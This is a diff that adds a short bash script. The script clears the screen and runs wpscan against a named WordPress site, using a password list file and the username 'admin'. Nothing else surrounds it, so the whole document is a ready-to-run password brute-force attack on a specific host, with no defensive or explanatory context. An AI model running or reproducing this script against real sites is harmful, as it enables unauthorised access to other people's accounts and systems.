@@ -1,0 +1,3 @@
+#! /bin/bash
+clear
+wpscan --url https://0530.hininja.site --passwords pass.txt --usernames 'admin'
